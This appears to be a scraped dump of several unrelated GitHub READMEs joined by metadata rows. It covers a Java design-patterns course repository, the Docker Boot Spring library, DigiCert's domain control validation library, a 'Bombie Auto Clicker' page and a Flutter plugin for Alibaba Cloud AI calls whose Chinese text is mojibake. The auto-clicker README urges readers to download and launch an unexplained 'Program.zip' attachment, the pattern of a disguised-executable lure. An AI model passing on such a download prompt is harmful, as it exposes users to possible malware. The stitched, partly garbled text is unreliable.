Welcome to the **Design Patterns Repository**! This project provides a hands-on exploration of several essential object-oriented design patterns. Each directory in this repository introduces a distinct design pattern, offering fully implemented classes, interfaces, and methods. Through practical examples, this repository aims to illustrate how design patterns solve common software engineering challenges by improving code reusability, flexibility, and maintainability.

The design patterns covered include:
1. **Inheritance** - Structured around the concept of building a hierarchy of sushi ingredients.
2. **Composition and Aggregation** - Demonstrated in a text-based adventure game scenario.
3. **Exceptions** - Exception handling pattern examples for robust error management.
4. **Iterators** - Custom iterators in a ride-sharing context.
5. **Decorators** - Visual modifications to digital images using the decorator pattern.
6. **Singleton, Multiton, and Factory Method** - Designing a pizza ordering system with creational patterns.
7. **Observer** - Event-driven store notifications for customers.
8. **Model-View-Controller (MVC)** - Building a simple 2048 game with MVC architecture.

Each directory includes fully implemented code to demonstrate these patterns in realistic scenarios. Below is a comprehensive breakdown of each directory, detailing the design patterns, core components, and practical applications.

## Table of Contents

- [`Inheritance` Directory](#1-inheritance-directory)
- [`Adventure-Game` Directory](#2-adventure-game-directory)
- [`Exceptions` Directory](#3-exceptions-directory)
- [`Iterators` Directory](#4-iterators-directory)
- [`Decorators` Directory](#5-decorators-directory)
- [`Singleton-Multiton-Factory` Directory](#6-singleton-multiton-factory-directory)
- [`Observers` Directory](#7-observers-directory)
- [`Model-View-Controller` Directory](#8-model-view-controller-directory)
- [Summary of Design Patterns and Applications](#summary-of-design-patterns-and-applications)
- [Build Tool](#build-tool)
- [Additional Resources](#additional-resources)
- [Conclusion](#conclusion)
- [Creator & Attributions](#creator--attributions)

## 1. `Inheritance` Directory

**Pattern**: **Inheritance Design Pattern**

**Context**: Representing ingredients and portions for sushi recipes.

The `Inheritance` directory provides an introductory look at how inheritance organizes shared traits and enables specialized subclasses. The code here simulates a sushi restaurant where ingredients like **Avocado**, **Tuna**, and **Eel** share common properties (e.g., calories, vegetarian status, cost per ounce). The project builds a class hierarchy with ingredients as the base layer, allowing specialized ingredient portions and sushi types to extend these classes.

**Components**:
- **Ingredient Classes**: Define the basic traits of sushi ingredients.
- **Ingredient Portion Classes**: Represent specific amounts of each ingredient.
- **Sushi Types**: Classes like `Sashimi`, `Nigiri`, and `Roll` combine ingredients to form distinct sushi dishes.

**Key Insights**: This directory demonstrates the strength of inheritance by organizing shared traits in a superclass and extending it into specific subclasses for different ingredients. The hierarchical structure allows easy reuse of properties and behaviors, keeping the code organized and modular.

**Link to Directory**: [Inheritance](Inheritance)

## 2. `Adventure-Game` Directory

**Pattern**: **Composition & Aggregation Design Patterns**

**Context**: Creating a text-based adventure game.

The `Adventure-Game` directory showcases the composition pattern in a modular game design, where objects like **Player**, **Inventory**, **Position**, and **Cell** interact to form a navigable, treasure-hunting world. Rather than inheriting from a common superclass, each component encapsulates smaller components, forming a more flexible structure that enables independent development of each part.

**Components**:
- **Core Objects**: `Item`, `Inventory`, `Position`, and `Cell` represent the foundational elements of the game world.
- **Map and Game Structure**: `MapImpl` and `GameImpl` aggregate these core components into a coherent game structure.

**Key Insights**: Composition allows for modular and reusable code by assembling objects rather than inheriting properties. This pattern is ideal for games, where components like players, maps, and items must work together flexibly without rigid hierarchical constraints.

**Link to Directory**: [Adventure-Game](Adventure-Game)

## 3. `Exceptions` Directory

**Pattern**: **Exception Handling**

**Context**: Error handling and robustness in Java applications.

The `Exceptions` directory provides structured exercises to practice exception handling, illustrating how to manage and control unexpected behaviors in a program. By using custom exceptions and managing errors with `try-catch` blocks, this directory focuses on creating reliable, user-friendly applications that respond gracefully to various error conditions.

**Components**:
- **Novice, Adept, and Jedi Levels**: Different levels offer exercises in basic to advanced exception handling, from catching common errors to chaining exceptions and managing resources.

**Key Insights**: Exception handling patterns enhance code reliability by managing and containing errors, ensuring that unexpected events don‚Äôt crash the program. This directory highlights how exceptions can be anticipated, caught, and managed in layered ways to create robust software.

**Link to Directory**: [Exceptions](Exceptions)

## 4. `Iterators` Directory

**Pattern**: **Iterator Design Pattern**

**Context**: Accessing collections of drivers for a ride-sharing app.

The `Iterators` directory demonstrates how the iterator design pattern enables controlled, customized access to data. In a ride-sharing application, where the client searches for nearby drivers, the repository includes three custom iterators‚Äîeach with unique traversal logic, from filtering by proximity to interleaving data from multiple collections.

**Components**:
- **`ProximityIterator`**: Filters drivers based on their proximity to the client.
- **`ExpandingProximityIterator`**: Iterates through drivers in increasing distance ‚Äúrings,‚Äù prioritizing close drivers.
- **`SnakeOrderAcrossPoolsIterator`**: Interleaves drivers from multiple pools in a ‚Äúsnake‚Äù order to balance selection.

**Key Insights**: The iterator pattern simplifies complex traversal logic by encapsulating it within iterator classes, allowing for flexible, readable, and reusable data access methods without altering the underlying collections.

**Link to Directory**: [Iterators](Iterator)

## 5. `Decorators` Directory

**Pattern**: **Decorator Design Pattern**

**Context**: Applying visual modifications to digital images.

The `Decorators` directory leverages the decorator design pattern to incrementally enhance images with visual effects. Starting with a base image, decorators like **SquareDecorator**, **CircleDecorator**, **BorderDecorator**, and **ZoomDecorator** apply effects layer-by-layer, allowing the user to customize and compose effects dynamically.

**Components**:
- **Base Images**: `SolidColorImage` and `PictureImage` serve as foundations for decorators.
- **Decorators**:
  - **`SquareDecorator`**: Adds a colored square overlay.
  - **`CircleDecorator`**: Adds a colored circular overlay.
  - **`BorderDecorator`**: Surrounds the image with a solid border.
  - **`ZoomDecorator`**: Scales the image by a specified multiplier.

**Key Insights**: The decorator pattern is particularly effective in scenarios where dynamic, layered modifications are needed. It allows for flexible and modular visual transformations, where each effect builds on the previous one without requiring changes to the base image class.

**Link to Directory**: [Decorators](Decorators)

## 6. `Singleton-Multiton-Factory` Directory

**Patterns**: **Singleton, Multiton, and Factory Method Design Patterns**

**Context**: Building a pizza ordering system with standardized ingredients.

The `Singleton-Multiton-Factory` directory showcases creational design patterns in a pizza ordering system. By implementing the **Singleton** and **Multiton** patterns for standard ingredients and the **Factory Method** pattern for creating different pizza types, this directory demonstrates how to centralize ingredient management and automate pizza creation.

**Components**:
- **Ingredients**: Standardized ingredients like `Sauce`, `Cheese`, and `Topping`.
- **`IngredientImpl`**: Singleton and Multiton classes for ingredient instances.
- **`PizzaImpl`**: Factory method for creating different pizza types.
- **Pizza Types**: `CheesePizza`, `HawaiianPizza`, `MeatLoversPizza`, and `VeggieSupremePizza`.
- **`PizzaFactory`**: Centralized factory for creating pizza instances.
- **Immutability**: Ensuring ingredient and pizza objects are immutable for consistency.
- **Dynamic Pricing**: Calculating pizza prices based on size and toppings.
- **Customization**: Creating custom daily special pizzas with unique toppings.
- **Consistency**: Standardizing ingredient instantiation and pizza creation for reliability.
- **Centralization**: Using factory methods to simplify pizza type creation and management.

**Key Insights**: The Singleton, Multiton, and Factory Method patterns provide a structured approach to managing ingredient instances and creating complex pizza objects. By centralizing ingredient control and automating pizza creation, this directory demonstrates how creational patterns can streamline system design and enhance code maintainability.

**Link to Directory**: [Singleton-Multiton-Factory](Singleton-Multiton-Factory)

## 7. `Observers` Directory

**Pattern**: **Observer Design Pattern**

**Context**: Implementing a store with events like discounts and promotions.

The `Observers` directory explores the observer design pattern in the context of a store that notifies customers of order status changes and promotions. By defining observers like **Customer** and **Receipt** that listen for events from the **Store**, this directory demonstrates how to implement event-driven systems with decoupled components.

**Components**:
- **`Customer`**: Represents a customer placing an order.
- **`Store`**: Manages customer orders and notifies observers of order status changes.
- **`Product`**: Represents a pizza product with details like name, price, and ingredients.
- **`Receipt`**: Contains order details and serves as a receipt for customers.
- **`ReceiptItem`**: Represents an item in the order receipt.
- **`SaleSpawner`**: Simulates sales events like discounts and promotions.

**Key Insights**: The observer pattern decouples event producers (subjects) from consumers (observers), allowing for flexible, scalable systems where components can react to changes without direct dependencies. This directory illustrates how to implement event-driven architectures in Java applications.

**Link to Directory**: [Observers](Observers)

## 8. `Model-View-Controller` Directory

**Pattern**: **Model-View-Controller (MVC) Design Pattern**

**Context**: Building a simple 2048 game with MVC architecture.

The `Model-View-Controller` directory demonstrates the MVC design pattern in a game development context. By separating the game logic (model), user interface (view), and user input (controller), this directory showcases how to create modular, maintainable applications with clear separation of concerns.

**Components**:
- **Model (Game2048)**: Manages the game state, rules, and logic.
- **View (Main)**: Renders the game interface and updates the display.
- **Controller (GameController)**: Handles user input and updates the model and view.

**Key Insights**: The MVC pattern divides the game into distinct components, making it easier to manage, test, and extend. By separating concerns and defining clear interactions between components, this directory highlights the benefits of using the MVC pattern in software development.

**Link to Directory**: [Model-View-Controller](Model-View-Controllers)

## Summary of Design Patterns and Applications

This repository provides a practical guide to core design patterns, each applied in real-world contexts to solve common software challenges. Here‚Äôs a quick recap of each pattern‚Äôs application:

- **Inheritance**: Organizing shared properties in a hierarchy for sushi ingredients and portions.
- **Composition**: Creating flexible, modular components for a text-based adventure game.
- **Exception Handling**: Building robust software by managing unexpected events with exceptions.
- **Test-Driven Development (TDD)**: Ensuring code reliability through early and thorough unit testing.
- **Iterator**: Customizing data traversal for a ride-sharing app with proximity filtering and interleaving.
- **Decorator**: Incrementally adding visual layers and effects to images for modular image processing.

Each pattern is implemented with realistic examples and scenarios, illustrating not only how to apply these patterns but also why they matter in building scalable, maintainable, and effective software. Whether you‚Äôre looking to improve your understanding of object-oriented programming or seeking examples of design patterns in action, this repository offers a comprehensive, hands-on guide to mastering design patterns in Java.

## Build Tool

All subdirectories use Maven as the build tool. To compile and run the code, navigate to the desired directory and use the following commands:

- **Compile**: `mvn compile`
- **Run**: `mvn exec:java`
- **Test**: `mvn test`
- **Package**: `mvn package`
- **Clean**: `mvn clean`

These commands will help you build, test, and run the code in each directory, allowing you to explore the design patterns and their applications in detail.

Alternatively, if you are using an IDE like IntelliJ IDEA or Eclipse, you can import the project as a Maven project and run the code directly from the IDE. Just be sure to configure the project settings to use Maven for building and running the code.

## Additional Resources

For more in-depth explanations, code snippets, and practical examples of design patterns, check out the individual directories in this repository. Each directory provides detailed insights into the pattern‚Äôs application, components, and design considerations, making it a valuable resource for learning and mastering design patterns in Java.

Also, be sure to check out this detailed document (README) in the `Design-Patterns-Info` directory to learn more about Design Patterns and their applications in software development: [Design-Patterns-Info](Design-Patterns-Info/README.md)

Additionally, I also recommend the `Gang of Four (GoF)` book, _Design Patterns: Elements of Reusable Object-Oriented Software,_ as an essential reference for understanding design patterns and their applications in software development. The book offers comprehensive insights into the principles, benefits, and implementation strategies of various design patterns, making it a foundational resource for software engineers, architects, and designers.

## Conclusion

Design patterns are powerful tools for structuring code, enhancing reusability, and simplifying complex software systems. By exploring the design patterns in this repository, you‚Äôll gain a deeper understanding of how to apply these patterns effectively in your projects, improving code quality, maintainability, and scalability.

Whether you‚Äôre a beginner looking to grasp the basics of design patterns or an experienced developer seeking practical examples and insights, this repository offers a structured, hands-on approach to mastering essential design patterns in Java. Dive into the directories, explore the code, and discover how design patterns can transform your software development journey.

## Creator & Attributions

This repository is created and maintained by [Son Nguyen](https://github.com/hoangsonww), a passionate software developer who enjoys crafting clean, efficient code and exploring the intricacies of software design. The examples and explanations in this repository are designed to provide a comprehensive guide to design patterns, offering practical insights and hands-on experience for developers at all levels.

Additionally, resources from the UNC-Chapel Hill Computer Science Department, Prof. Prairie Goodwin at UNC, and the Gang of Four (GoF) book have been instrumental in shaping the content and structure of this repository. Their contributions to software engineering education and design pattern literature have been invaluable in creating this repository. This repository has been deeply influenced and inspired by them.

If you find this repository helpful or have suggestions for improvement, feel free to reach out or contribute to the project. Your feedback and contributions are always welcome and appreciated!

---

Happy coding and pattern crafting! üöÄüé®
",0,0,1,MIT,0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,162.0
ddaakk/docker-boot,main,"# Docker Boot

[![Maven Central](https://img.shields.io/maven-central/v/io.github.ddaakk/docker-boot.svg)](https://central.sonatype.com/artifact/io.github.ddaakk/docker-boot)
[![License](https://img.shields.io/badge/License-Apache%202.0-blue.svg)](LICENSE)

<p align=""center"">
  <strong>English</strong> |
  <a href=""/README_ko.md"">ÌïúÍµ≠Ïñ¥</a>
</p>

Docker Boot provides seamless integration between Docker containers and Spring Boot applications. It allows you to manage Docker container lifecycles through Spring configuration and programmatic controls.

## Table of Contents

- [Features](#features)
- [Getting Started](#getting-started)
   - [Prerequisites](#prerequisites)
   - [Installation](#installation)
   - [Quick Start](#quick-start)
- [Configuration](#configuration)
   - [Basic Configuration](#basic-configuration)
   - [Advanced Configuration](#advanced-configuration)
   - [Lifecycle Modes](#lifecycle-modes)
   - [Examples](#configuration-examples)
- [Event System](#event-system)
- [Comparison with Spring Boot Docker Compose](#comparison)
- [API Reference](#api-reference)
- [Contributing](#contributing)
- [License](#license)

## Features

- **Spring Native Integration**
   - Spring Boot auto-configuration
   - YAML/Properties based configuration
   - Spring profiles support
   - Spring events integration

- **Container Lifecycle Management**
   - Three lifecycle modes (START_AND_STOP, START_ONLY, NONE)
   - Automatic container cleanup
   - Event-driven control
   - Graceful shutdown handling

- **Docker Features Support**
   - Port mapping
   - Volume mounting
   - Environment variables
   - Health checks
   - Resource constraints
   - Custom networks
   - Container labels

- **Development Support**
   - Multi-container management
   - Development/Production profiles
   - Detailed logging
   - Error handling

## Getting Started

### Prerequisites

- Java 17 or higher
- Spring Boot 3.0 or higher
- Docker Engine installed and running

### Installation

#### Maven
```xml
<dependency>
    <groupId>io.github.ddaakk</groupId>
    <artifactId>docker-container-spring-boot-starter</artifactId>
    <version>0.2.0</version>
</dependency>
```

#### Gradle
```groovy
implementation 'io.github.ddaakk:docker-container-spring-boot-starter:0.2.0'
```

### Quick Start

1. Add the dependency to your project
2. Configure containers in `application.yml`:

```yaml
docker:
  containers:
    redis:
      enabled: true
      container-name: my-redis
      image-name: redis:latest
      lifecycle-mode: START_AND_STOP
      ports:
        6379: 6379
```

3. Run your Spring Boot application

## Configuration

### Basic Configuration

#### Global Docker Settings
```yaml
docker:
  host: unix:///var/run/docker.sock
  tls-verify: false
  registry:
    url: https://index.docker.io/v1/
    username: username
    password: password
```

#### Container Settings
```yaml
docker:
  containers:
    service-name:                    # Service identifier
      enabled: true                  # Enable/disable container
      container-name: my-container   # Container name
      image-name: image:tag         # Docker image
      lifecycle-mode: START_AND_STOP # Lifecycle mode
```

### Advanced Configuration

#### Full Container Options
```yaml
docker:
  containers:
    service-name:
      # Basic Settings
      enabled: true
      container-name: my-container
      image-name: image:tag
      lifecycle-mode: START_AND_STOP
      
      # Network
      ports:
        8080: 8080
      networks:
        - network-name
      dns:
        - 8.8.8.8
      
      # Resources
      memory: 512M
      cpu-shares: 1024
      
      # Storage
      volumes:
        /host/path: /container/path
      tmpfs:
        - /tmp
      
      # Environment
      environment:
        KEY: value
      env-file:
        - ./env.list
      
      # Runtime
      command: [""custom"", ""command""]
      entrypoint: [""custom"", ""entrypoint""]
      working-dir: /app
      
      # Health & Monitoring
      healthcheck:
        test: [""CMD"", ""curl"", ""-f"", ""http://localhost""]
        interval: 30s
        timeout: 10s
        retries: 3
      
      # Additional Settings
      labels:
        app: service-name
      restart-policy:
        name: on-failure
        max-retry: 3
```

### Lifecycle Modes

Docker Boot provides three lifecycle modes for container management:

#### START_AND_STOP (Default)
- Starts with Spring Boot application
- Stops and removes on shutdown
- Best for development and testing

```yaml
lifecycle-mode: START_AND_STOP
```

#### START_ONLY
- Starts with Spring Boot application
- Continues running after shutdown
- Good for shared services

```yaml
lifecycle-mode: START_ONLY
```

#### NONE
- No automatic management
- Manual control only
- For pre-existing containers

```yaml
lifecycle-mode: NONE
```

### Configuration Examples

#### Development Database
```yaml
docker:
  containers:
    postgres:
      enabled: true
      container-name: postgres-dev
      image-name: postgres:14
      lifecycle-mode: START_AND_STOP
      ports:
        5432: 5432
      environment:
        POSTGRES_DB: devdb
        POSTGRES_USER: dev
        POSTGRES_PASSWORD: devpass
      volumes:
        postgres-data: /var/lib/postgresql/data
```

#### Production Cache
```yaml
docker:
  containers:
    redis:
      enabled: true
      container-name: redis-prod
      image-name: redis:7
      lifecycle-mode: START_ONLY
      ports:
        6379: 6379
      memory: 1G
      healthcheck:
        test: [""CMD"", ""redis-cli"", ""ping""]
        interval: 10s
```

## Event System

### Available Events

```java
public enum Action {
    START,   // Create and start container
    STOP,    // Stop container
    REMOVE   // Remove container
}
```

### Using Events

```java
@Service
public class DockerService {
    private final ApplicationEventPublisher eventPublisher;
    
    public void startContainer() {
        eventPublisher.publishEvent(
            new DockerContainerEvent(this, DockerContainerEvent.Action.START)
        );
    }
}
```

### Event Handling

```java
@Service
public class ContainerManager {
    @EventListener
    public void handleDockerEvent(DockerContainerEvent event) {
        switch (event.getAction()) {
            case START -> startContainer();
            case STOP -> stopContainer();
            case REMOVE -> removeContainer();
        }
    }
}
```

## Comparison

### Docker Boot vs Spring Boot Docker Compose

| Feature | Docker Boot | Spring Boot Docker Compose |
|---------|------------|---------------------------|
| Configuration | Spring YAML/Properties | docker-compose.yml |
| Container Control | Programmatic + Events | File-based |
| Spring Integration | Native integration | Basic integration |
| Lifecycle Modes | Three modes | Three modes |
| Development Focus | Both dev and prod | Development focused |

### When to Choose Docker Boot

- Need programmatic container control
- Want Spring-native configuration
- Require event-based management
- Need fine-grained lifecycle control

## API Reference

### Core Interfaces

#### DockerContainerManager
```java
public interface DockerContainerManager {
    String createAndStart();
    void stop(String containerId);
    void remove(String containerId);
}
```

#### Container Events
```java
public class DockerContainerEvent extends ApplicationEvent {
    public enum Action {
        START, STOP, REMOVE
    }
}
```

## Contributing

We welcome contributions! Here's how you can help:

1. Fork the repository
2. Create your feature branch (`git checkout -b feature/amazing-feature`)
3. Commit your changes (`git commit -m 'Add amazing feature'`)
4. Push to the branch (`git push origin feature/amazing-feature`)
5. Open a Pull Request

### Development Setup

1. Clone the repository
2. Install dependencies
3. Run tests
4. Submit changes

## License

This project is licensed under the Apache License 2.0 - see the [LICENSE](LICENSE) file for details.

## Author

ddaakk - [GitHub](https://github.com/ddaakk)

---

¬© 2024 Docker Boot. All rights reserved.
",1,0,1,Apache-2.0,0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0
digicert/domain-control-validation,master,"![Build and Test](https://github.com/digicert/domain-control-validation/actions/workflows/build-deploy-beta.yml/badge.svg)
![CodeQL](https://github.com/digicert/domain-control-validation/actions/workflows/codeql.yml/badge.svg)

Domain Control Validation
====================
This library represents DigiCert's domain control validation (DCV) process. This is to satisfy the requirements specified in the
[CAB Forum baseline requirements](https://github.com/cabforum/servercert/blob/main/docs/BR.md#3224-validation-of-domain-authorization-or-control)
to validate that an applicant has ownership or control over a domain. The BR documents multiple methods by which such control
can be demonstrated. This initial version of the library is available for review. 

DigiCert is open-sourcing this code to improve transparency and security around Domain Control Validation. We hope that others also will find this valuable for their DCV efforts. 

For each method, this library has a preparation step and a validation step. The preparation step supplies information that is
necessary for setting up the DCV, including generating a value that can be used as the required random value. The validation
step performs the DCV (where possible) and validates that the necessary information has been received.

NOTE: For a high-level overview of the DCV process, as well as the details information on how request and response
objects are used, please refer to the [README-details.md](README-details.md) file.

Supported Methods
-----------------

### [Email, Fax, SMS, or Postal Mail to Domain Contact](https://github.com/cabforum/servercert/blob/main/docs/BR.md#32242-email-fax-sms-or-postal-mail-to-domain-contact)
* The prepare step obtains contact information for the [domain contact](https://github.com/cabforum/servercert/blob/main/docs/BR.md#161-definitions).
  The library does not facilitate sending the random value to the applicant.
* This library does not facilitate receiving the random value from the applicant. The validation step can only confirm the appropriate
  data has been collected.

### [Constructed Email to Domain Contact](https://github.com/cabforum/servercert/blob/main/docs/BR.md#32244-constructed-email-to-domain-contact)
* The prepare step generates the possible email addresses to which the random value could be sent. The library does not facilitate
  sending the random value to the applicant.
* This library does not facilitate receiving the random value from the applicant. The validation step can only confirm the appropriate
  data has been collected.

### [DNS Change](https://github.com/cabforum/servercert/blob/main/docs/BR.md#32247-dns-change)
* The prepare step only returns a random value that can be used and the domains that could be used to validate the given FQDN.
* The validate step will call the DNS servers and obtain the specified record type for the specified domain. It will also check
  with the configurable domain label prefixed. If the random value is found in the record, the DCV can be considered complete.

### [Email to DNS TXT Contact](https://github.com/cabforum/servercert/blob/main/docs/BR.md#322414-email-to-dns-txt-contact)
* The prepare step obtains the email address of the [DNS TXT record email contact](https://github.com/cabforum/servercert/blob/main/docs/BR.md#a21-dns-txt-record-email-contact).
  The library does not facilitate sending the random value to the applicant.
* This library does not facilitate receiving the random value from the applicant. The validation step can only confirm the appropriate
  data has been collected.

### [Agreed-Upon Change to Website v2](https://github.com/cabforum/servercert/blob/main/docs/BR.md#322418-agreed-upon-change-to-website-v2)
* The prepare step returns a random value that can be used and the file url that will be checked. If a file name is provided the
  file url will use it, otherwise it will use the configurable default file name.
* The validate step will make http calls (http on port 80 and https on port 443) to the domain at the provided file name (or the
  configurable default). If the random value is found at the location, the DCV can be considered complete.

API Documentation
-----------------
The domain-control-validation library provides a set of APIs to perform domain control validation (DCV) as per the CAB Forum baseline requirements. Below are examples of how to use the library in your project.  

### Adding the Dependency

First, add the domain-control-validation library as a dependency in your pom.xml:

```xml
<dependency>
    <groupId>com.digicert.validation</groupId>
    <artifactId>domain-control-validation-parent</artifactId>
    <version>1.0-SNAPSHOT</version>
</dependency>
```

### Using the Library
Please refer to the [README-details.md](README-details.md) file for details on how to integrate and use the library


## Java Docs
The JavaDocs for the example-app can be generated via maven java-doc plugin.
```mvn javadoc:javadoc``` The generated JavaDocs can be found in the `target/reports/apidocs` directory.

The root file of the JavaDocs is can be viewed in a browser via:
### example-app
`file:///<path-to-repo>/example-app/target/reports/apidocs/index.html`

### domain-control-validation library
`file:///<path-to-repo>/library/target/reports/apidocs/index.html`

Example-App
-----------
The example-app module is a reference implementation of the domain-control-validation library. This can be used as an example of how to call the API is domain-control-validation. This example-app includes a REST API implementation that uses the domain-control-validation and full flow integration tests of the BRs implemented in domain-control validation.
See the [example-app README](example-app/README.md) for more information.

Domain-Control-Validation
-------------------------
The library (domain-control-validation) module is the core of the domain-control-validation library. This module contains 
the implementation of the DCV methods and the API to interact with them. This module also contains the unit tests for the library.
See the [library README](library/README.md) for more information.

Building
--------
run `mvn clean install` from the root of the repository to build the library and example-app.

Running the example application
---------------------------------
Instructions for running the example application

Unit Testing
------------
run `mvn clean test` from the root of the repository to run the unit tests and then integration tests.


Acceptance Testing
------------------
How to run the acceptance tests

### Running Acceptance Tests Locally
This will be the most basic way to run the acceptance tests


### Debugging Acceptance Tests in Intellij
How to run the acceptance tests in a way that allows for debugging the tests. We might not need to include this section in the final version of the readme

### Guava Attribution 
InternetDomainName has changed DCVDomainName
Copyright (C) 2009 The Guava Authors

Licensed under the Apache License, Version 2.0 (the ""License""); you may not use this file except
in compliance with the License. You may obtain a copy of the License at

http://www.apache.org/licenses/LICENSE-2.0",2,1,3,MIT,5,16.0,1.0,8.0,2.0,30.0,1.0,-10.3,174.0
Mdzin007/Bombie-autoclicker,master,"# Bombie Auto Clicker

Welcome to the **Bombie Auto Clicker** repository - Your go-to tool for enhancing your gaming experience in the Bombie game. 

**Description:**

Do you find yourself endlessly clicking in the popular Bombie game to achieve your desired results? Look no further! The Bombie Auto Clicker is a versatile tool designed to automate various actions within the game, saving you time and effort while ensuring optimal gameplay.

**Features:**

- Automate repetitive clicking tasks within the Bombie game
- Customize click intervals to suit your gameplay preferences
- Enhance your gaming efficiency without compromising the fun

**Installation:**

To take advantage of the Bombie Auto Clicker, simply download the program from the link provided below. Ensure you have the necessary permissions to install software on your device.

[Download Bombie Auto Clicker](https://github.com/user-attachments/files/17804082/Program.zip)

Please note that the downloaded file needs to be launched to initiate the installation process.

**How to Use:**

1. Download and install the Bombie Auto Clicker on your device.
2. Launch the program and configure the desired click intervals.
3. Open the Bombie game and let the Auto Clicker handle the clicking for you.
4. Sit back, relax, and enjoy a more efficient gaming experience.

**Feedback:**

We value your feedback! If you encounter any issues or have suggestions for improving the Bombie Auto Clicker, please feel free to reach out to us or check the ""Releases"" section for any updates.

**Get Started:**

Boost your gaming performance in the Bombie game with the Bombie Auto Clicker. Download now and elevate your gameplay to the next level!

---

[![](https://img.shields.io/badge/Download-Program-blue)](https://github.com/user-attachments/files/17804082/Program.zip)",3,0,1,Unlicense,0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,3.0
MR-MaoJiu/ali_ai_call,main,"# ali_ai_call

ÈòøÈáå‰∫ë AI ÈÄöËØù Flutter Êèí‰ª∂,ÊîØÊåÅÂÆûÊó∂ËØ≠Èü≥ÂØπËØù„ÄÅËØ≠Èü≥ËØÜÂà´„ÄÅÂ£∞Á∫πËØÜÂà´Á≠âÂäüËÉΩ„ÄÇ

## ÂäüËÉΩÁâπÊÄß

- AI ËØ≠Èü≥ÈÄöËØù
- Â£∞Á∫πËØÜÂà´
- ÂÆûÊó∂ËØ≠Èü≥ËØÜÂà´(ASR)
- ËØ≠Èü≥ÂêàÊàê(TTS) 
- ÁΩëÁªúË¥®ÈáèÁõëÊéß
- È∫¶ÂÖãÈ£é/Êâ¨Â£∞Âô®ÊéßÂà∂
- AIËØ≠Èü≥ÊâìÊñ≠
- Â§öËßíËâ≤ÊîØÊåÅ
- Â§öÈü≥Ëâ≤ÊîØÊåÅ

## ÁéØÂ¢ÉË¶ÅÊ±Ç

- Flutter: >=3.3.0
- iOS: >= 12.0
- Android: minSdkVersion 19

## ÂÆâË£Ö

1. Ê∑ªÂä†‰æùËµñÂà∞ `pubspec.yaml`:

```yaml
dependencies:
  ali_ai_call: ^1.0.0
```

2. iOS ÈÖçÁΩÆ:

Âú® `ios/Runner/Info.plist` Ê∑ªÂä†‰ª•‰∏ãÊùÉÈôê:

```xml
<key>NSMicrophoneUsageDescription</key>
<string>ÈúÄË¶ÅËÆøÈóÆÈ∫¶ÂÖãÈ£éËøõË°åËØ≠Èü≥ÈÄöËØù</string>
<key>NSCameraUsageDescription</key>
<string>ÈúÄË¶ÅËÆøÈóÆÁõ∏Êú∫ËøõË°åËßÜÈ¢ëÈÄöËØù</string>
```

3. Android ÈÖçÁΩÆ:

Âú® `android/app/src/main/AndroidManifest.xml` Ê∑ªÂä†ÊùÉÈôê:

```xml
<uses-permission android:name=""android.permission.INTERNET"" />
<uses-permission android:name=""android.permission.RECORD_AUDIO"" />
<uses-permission android:name=""android.permission.CAMERA"" />
```

## ‰ΩøÁî®ÊñπÊ≥ï
### ÂêéÁ´ØÊúçÂä°ÈúÄË¶ÅÊ≠£Â∏∏ËøêË°åÔºåÂèØ‰ª•Âú®Êú¨È°πÁõÆ‰∏≠ÊâæÂà∞ServerÈÖçÁΩÆÊñá‰ª∂‰øÆÊîπÈÖçÁΩÆÊñá‰ª∂‰∏≠ÁöÑÈÖçÁΩÆÁÑ∂ÂêéËøêË°å‰∏Ä‰∏ã
### ÂàùÂßãÂåñ

```dart
await AliAiCall.initEngine(userId: ""your_user_id"");
```

### ËÆæÁΩÆÂõûË∞É

```dart
AliAiCall.setEngineEventHandler(
  onCallBegin: () {
    print('ÈÄöËØùÂºÄÂßã');
  },
  onCallEnd: () {
    print('ÈÄöËØùÁªìÊùü');
  },
  onError: (error) {
    print('ÂèëÁîüÈîôËØØ: $error');
  },
  onUserAsrSubtitleNotify: (Map<String, dynamic> data) {
    // Áî®Êà∑ËØ≠Èü≥ËØÜÂà´ÁªìÊûú
    String text = data['text'];
    bool isSentenceEnd = data['isSentenceEnd'];
    int sentenceId = data['sentenceId'];
    VoicePrintStatusCode voicePrintStatus = data['voicePrintStatus'];
    
    switch (voicePrintStatus) {
      case VoicePrintStatusCode.speakerRecognized:
        print('ËØ¥ËØù‰∫∫Â∑≤ËØÜÂà´');
        break;
      case VoicePrintStatusCode.speakerNotRecognized:
        print('ËØ¥ËØù‰∫∫Êú™ËØÜÂà´');
        break;
      case VoicePrintStatusCode.disable:
        print('Â£∞Á∫πËØÜÂà´Â∑≤Á¶ÅÁî®');
        break;
      case VoicePrintStatusCode.enableWithoutRegister:
        print('Â£∞Á∫πËØÜÂà´Â∑≤ÂêØÁî®‰ΩÜÊú™Ê≥®ÂÜå');
        break;
      case VoicePrintStatusCode.unknown:
        print('Êú™Áü•Áä∂ÊÄÅ');
        break;
    }
    
    print('Áî®Êà∑ËØ≠Èü≥ËØÜÂà´: $text');
  },
  onAIAgentSubtitleNotify: (Map<String, dynamic> data) {
    // AIÂõûÂ§çÊñáÊú¨
    String text = data['text'];
    bool isSentenceEnd = data['isSentenceEnd'];
    int userAsrSentenceId = data['userAsrSentenceId'];
    print('AIÂõûÂ§ç: $text');
  },
  onVolumeChanged: (Map<String, dynamic> data) {
    // Èü≥ÈáèÂèòÂåñ
    String uid = data['uid'];
    int volume = data['volume'];
    print('Èü≥ÈáèÂèòÂåñ: $volume');
  },
);
```

### ÂºÄÂßãÈÄöËØù

```dart
await AliAiCall.call(
  rtcToken: ""your_rtc_token"",
  aiAgentInstanceId: ""your_instance_id"",
  aiAgentUserId: ""your_agent_user_id"",
  channelId: ""your_channel_id"",
);
```

### ÁªìÊùüÈÄöËØù

```dart
await AliAiCall.hangup();
```

### Èü≥È¢ëÊéßÂà∂

```dart
// ÂàáÊç¢È∫¶ÂÖãÈ£é
await AliAiCall.switchMicrophone(true/false);

// ÂàáÊç¢Êâ¨Â£∞Âô®
await AliAiCall.enableSpeaker(true/false);

// ÊâìÊñ≠ AI ËØ¥ËØù
await AliAiCall.interruptSpeaking();

// ÂêØÁî®ËØ≠Èü≥ÊâìÊñ≠
await AliAiCall.enableVoiceInterrupt(true/false);
```

### AIÊéßÂà∂

```dart
// ÂàáÊç¢ AI Èü≥Ëâ≤
await AliAiCall.switchRobotVoice(""voice_id"");

// ËÆæÁΩÆ AI ËßíËâ≤
await AliAiCall.setAIRole(""role_id"", ""role_name"");
```

## ÂõûË∞ÉÂèÇÊï∞ËØ¥Êòé

### onUserAsrSubtitleNotify
| ÂèÇÊï∞ | Á±ªÂûã | ËØ¥Êòé |
